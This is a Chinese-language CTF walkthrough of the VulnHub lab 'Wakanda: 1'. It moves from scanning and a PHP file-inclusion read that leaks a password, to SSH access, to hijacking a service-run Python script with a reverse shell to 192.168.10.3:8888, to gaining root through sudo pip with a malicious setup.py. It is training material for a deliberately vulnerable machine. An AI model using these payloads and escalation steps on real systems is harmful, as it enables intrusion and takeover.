# Wakanda: 1

2024-4-20 https://www.vulnhub.com/entry/wakanda-1,251/

difficulty: Intermediate

## IP

192.168.10.172

## Scan

Open Port -> 80,111,3333,44502

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Vibranium Market
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37702/udp   status
|   100024  1          39758/udp6  status
|   100024  1          44502/tcp   status
|_  100024  1          46769/tcp6  status
3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 1c984756fcb814088f93ca36447fea7a (DSA)
|   2048 f1d50478d33a9bdc13df0f5f7ffbf426 (RSA)
|   256 d834415d9bfe51bcc64e02145ee108c5 (ECDSA)
|_  256 0ef58d293c7357c738086d5084b66c27 (ED25519)
44502/tcp open  status  1 (RPC #100024)
```

先对 80web 页面进行目录扫描，看看有什么有价值目录。

```
http://192.168.10.172/backup               (Status: 200) [Size: 0]
http://192.168.10.172/fr.php               (Status: 200) [Size: 0]
http://192.168.10.172/index.php            (Status: 200) [Size: 1527]
http://192.168.10.172/shell                (Status: 200) [Size: 0]
http://192.168.10.172/secret               (Status: 200) [Size: 0]
http://192.168.10.172/admin                (Status: 200) [Size: 0]
```

发现这些页面都是空页面，没有任何价值。

查看 http://192.168.10.172/ 中的源代码，发现有这样一段注释：

```
<!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
```

是一个参数，让我们把它拼接到主页上看看有什么效果 http://192.168.10.172/?lang=fr ，我们看到页面上显示的文字变成了法语，说明这个参数能控制页面上加载的内容，很容易联想到有文件包含漏洞，使用 php 包装器看看 index.php 中有什么内容：http://192.168.10.172/?lang=php://filter/read=convert.base64-encode/resource=index 得到了 index.php 的源码：

```php
<?php
$password ="Niamey4Ever227!!!" ;//I have to remember it

if (isset($_GET['lang']))
{
include($_GET['lang'].".php");
}
?>
<?php
if (isset($_GET['lang']))
{
echo $message;
}
else
{
?>
Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!
<?php
}
?>

</body></html>
```

发现密码信息：Niamey4Ever227!!! ，现在我们需要一个用户名，再次查看主页的显示内容，在最底部发现了这样的内容：Made by@mamadou，那么这个 mamadou 有没有可能就是用户名，让我们尝试 ssh 登陆 3333 端口，登陆成功，但是显示的终端好像不是一个 bash，像是一个 python 的接口，进行验证：print 1，能够输出 1，可以直接升级到 tty：import pty; pty.spawn("/bin/bash")，就显示了一个正常的 bash 界面。

## flag1

在 /home/mamadou 中找到了 flag1.txt：

```
mamadou@Wakanda1:~$ cat flag1.txt

Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc
```

## flag2

在 /home/devops 发现了 flag2.txt，但是目前我们没有权限去读取这个文件。经过 linpeas 系统枚举，发现了一个隐藏文件：/srv/.antivirus.py，这个文件的所属者为 devops，从名字上看，这个文件有可能是被 cron 定时调用，而且这个文件对我们有写权限，看看里面什么内容：

```
open('/tmp/test','w').write('test')
```

通过对 file /tmp/test 文件的更新时间来看，发现是每隔 5 分钟就写入一次。将以下脚本信息写入到 文件中，等待 5 分钟，获得反弹的 shell 连接：

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.3",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' > /srv/.antivirus.py
```

升级下 tty，获得了 flag2:

```
Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098
```

## flag3

flag3 应该是在/root 目录中，需要我们升级到 root 权限才能读取。

sudo -l 看看有什么可以利用的程序：

```
devops@Wakanda1:/var/spool/cron$ sudo -l
sudo -l
Matching Defaults entries for devops on Wakanda1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User devops may run the following commands on Wakanda1:
    (ALL) NOPASSWD: /usr/bin/pip
```

使用 pip 升级到 root 权限：

```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF

# id

uid=0(root) gid=0(root) groups=0(root)
```

读取 flag3:

```
# cat root.txt
cat root.txt
 _    _.--.____.--._
( )=.-":;:;:;;':;:;:;"-._
 \\\:;:;:;:;:;;:;::;:;:;:\
  \\\:;:;:;:;:;;:;:;:;:;:;\
   \\\:;::;:;:;:;:;::;:;:;:\
    \\\:;:;:;:;:;;:;::;:;:;:\
     \\\:;::;:;:;:;:;::;:;:;:\
      \\\;;:;:_:--:_:_:--:_;:;\
       \\\_.-"             "-._\
        \\
         \\
          \\
           \\ Wakanda 1 - by @xMagass
            \\
             \\


Congratulations You are Root!

821ae63dbe0c573eff8b69d451fb21bc
```

## 拓展

找到 5 分钟执行一次的任务是在哪里触发的，cron 中没有相关记录，可能是在系统 service 中，对/lib/systemd/system/目录进行查看，发现 /lib/systemd/system/antivirus.service 查看其内容为：

```
[Unit]
Description=Antivirus
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=300
User=devops
ExecStart=/usr/bin/env python /srv/.antivirus.py

[Install]
WantedBy=multi-user.target
```

RestartSec=300 确实是 5 分钟执行一次。
